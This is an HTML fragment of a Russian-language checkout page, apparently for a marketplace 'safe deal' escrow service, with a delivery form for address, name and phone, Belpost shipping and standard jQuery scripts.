													<p class="hint__2YlkHbKL hint__2r7xW549">Договаривайтесь с продавцом о месте и времени передачи товара самостоятельно. Деньги за оплату товара продавец получит только после того, как вы подтвердите успешное получение товара. А в случае возникновения спорной ситуации, уладить возникшие разногласия поможет сервис «Безопасная сделка».</p>
													<div class="hint payhint__1EGeMlob">Нажимая кнопку «Перейти к оплате», вы соглашаетесь с заключением Договора купли-продажи товаров с использованием Онлайн сервиса «Безопасная сделка» </div>
												</div>
												<div id="delivery_ne_sam" style="">
													<div class="form__1P2Y3sX1">
														<label class="label__332nHo7g">Адрес доставки</label>
														<div class="row" style="height: 100px;">
															<div class="col-md-8">
																<div class="root__3ahLIWiH">
																	<div class="from_group form_group__3-PlZQuP">
																		<input type="text" class="form_control form_control__3Uyg-pWq" name="address" id="address" placeholder="Город, улица, дом" value="" required>
																	</div>
																</div>
															</div>
															<div class="col-md-4">
																<div class="from_group form_group__3-PlZQuP">
																	<input type="text" class="form_control form_control__3Uyg-pWq" name="flat" id="flat" placeholder="Квартира/Офис" value="" required>
																</div>
															</div>
														</div>
														<label class="label__332nHo7g">Данные покупателя (для курьера и/или сообщений о статусе заказа)</label>
														<div class="row" style="position: relative;">
															<div class="col-md-4">
																<div class="from_group form_group__3-PlZQuP">
																	<input type="text" class="form_control form_control__3Uyg-pWq" name="lastname" id="lastname" placeholder="Фамилия" maxlength="25" value="" required>
																</div>
															</div>
															<div class="col-md-4">
																<div class="from_group form_group__3-PlZQuP">
																	<input type="text" class="form_control form_control__3Uyg-pWq" name="firstname" id="firstname" placeholder="Имя" maxlength="25" value="" required>
																</div>
															</div>
															<div class="col-md-4">
																<div class="from_group form_group__3-PlZQuP">
																	<input type="text" class="form_control form_control__3Uyg-pWq" name="middlename" id="middlename" placeholder="Отчество" maxlength="25" value="" required>
																</div>
															</div>
														</div>
														<div class="row">
															<div class="col-md-4">
																<div class="from_group form_group__3-PlZQuP">
																	<div class="_yjs_field-string sc-kqEXUp gcsdCy">
																		<div class="sc-guDjWT eIKgzJ">
																			<input type="tel" class="form_control form_control__3Uyg-pWq sc-goFBvh ddsTSB" name="phone" id="phone" placeholder="Телефон" maxlength="18" required> </div>
																		<div class="sc-iKiVwC vNKsO"></div>
																	</div>
																</div>
															</div>
														</div>
														<p class="hint__2r7xW549">На указанный номер телефона будут приходить SMS сообщения о статусе доставки и оплаты. Другие пользователи не увидят этот номер телефона.</p>
														<div class="boxberry_text__24q32W-A"><a href="http://belpost.by/" target="_blank" rel="noopener noreferrer"><img src="/assets/img/belpost.png" alt="Белпочта" width="92" height="32"></a>Доставка осуществляется через Белпочту.</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="overlay">
			<div class="loader hide"></div>
		</div>
		<div class="global">
			<div></div>
		</div>
	</div>
	<script src="/assets/js/jquery-3.4.1.slim.js"></script>
	<script src="/assets/js/maskedinput.js"></script>
	<!-- <script>
		$(document).ready(function() {
			$("#phone").mask("+7 (999) 999-99-99");
		});
	</script> -->
</body>
</html>